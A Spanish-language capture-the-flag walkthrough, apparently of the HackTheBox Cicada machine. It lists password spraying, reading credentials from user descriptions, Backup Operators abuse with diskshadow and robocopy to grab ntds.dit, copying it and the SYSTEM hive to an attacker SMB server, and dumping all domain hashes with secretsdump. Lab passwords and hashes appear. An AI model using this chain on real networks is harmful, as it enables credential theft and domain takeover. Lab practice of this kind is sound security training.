Lista usuarios

Explotación: Password Spray contra usuarios del dominio con la contraseña encontrada

Password Spray

nxc smb 10.129.16.41 -u users -p 'Cicada$M6Corpb*@Lp#nZp!8' --continue-on-succes
# Credenciales -> michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8

Movimiento lateral: Descripción usuario que revela credenciales

Descripción usuario

nxc smb 10.129.16.41 -u 'michael.wrightson' -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
# Alternativa
ldapsearch -x -H ldap://10.129.16.41 -D 'michael.wrightson@cicada.htb' -w 'Cicada$M6Corpb*@Lp#nZp!8' -b 'DC=cicada,DC=htb' |  grep -iE "pass" -C 2
# Credenciales -> david.orelious:aRt$Lp#7t*VQ!3

Movimiento lateral: Share con credenciales expuestas

Dumpear Shrare

Escalada de Privilegios: Grupo Backup Operators

Shadow.txt -> Añadir un espacio al final de cada linea

set context persistent nowriters 
add volume c: alias unidad 
create 
expose %unidad% z:

Lanzar diskshadow desde un fichero

diskshadow.exe /s c:\Temp\shadow.txt

Recuperar el fichero ntds.dit que se encuentra en originalmente en c:\Windows\NTDS\ desde z:\Windows\NTDS\

robocopy /b z:\Windows\NTDS\ . ntds.dit

Transferir archivo con SMB

# Kali
impacket-smbserver recurso $(pwd) -smb2support
# Windows
copy ntds.dit //10.10.16.130/recurso/
reg.exe save hklm\system \\10.10.16.130\recurso\SYSTEM.save

Kali: Dumpear ntds.dit

impacket-secretsdump -ntds ntds.dit -system SYSTEM.save -hashes lmhash:nthash LOCAL
# Obtenemos todos los hashes del dominio
# Administrator -> aad3b435b51404eeaad3b435b51404ee:2b87e7c93a3e8a0ea4a581937016f341
